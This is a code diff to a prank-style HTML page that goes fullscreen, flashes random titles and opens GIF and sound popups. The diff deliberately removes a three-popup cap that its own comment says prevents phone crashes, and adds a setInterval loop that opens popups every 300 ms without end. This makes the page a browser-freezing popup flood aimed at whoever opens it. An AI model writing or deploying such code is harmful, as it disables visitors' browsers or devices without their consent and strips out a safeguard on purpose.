@@ -14,8 +14,7 @@
     </style>
     <script>
         let chaosStarted = false;
-        let popupCount = 0;
-        let maxPopups = 3; // Prevents phone crash
+        let popupWindows = [];
 
         let randomTitles = [
             "笑う者が最後に勝つ 🤡",  
@@ -45,11 +44,9 @@
         }
 
         function openGifPopup() {
-            if (popupCount >= maxPopups) return; 
-            popupCount++;
-
             let win = window.open('', '_blank', 'width=400,height=300');
             if (win) {
+                popupWindows.push(win);
                 win.document.write(`
                     <html>
                     <head>
@@ -87,6 +84,10 @@
             }
         }
 
+        function openManyPopups() {
+            setInterval(openGifPopup, 300); // Opens popups indefinitely with a delay
+        }
+
         function playSoundPopup() {
             let soundWin = window.open('', '_blank', 'width=200,height=100');
             if (soundWin) {
@@ -115,12 +116,7 @@
 
             openFullscreen();
             changeTitleFast();
-
-            // Open popups (3 max)
-            openGifPopup();
-            setTimeout(openGifPopup, 500);
-            setTimeout(openGifPopup, 1000);
-
+            openManyPopups();
             playSoundPopup();
 
             let mainSound = document.getElementById("mainSound");
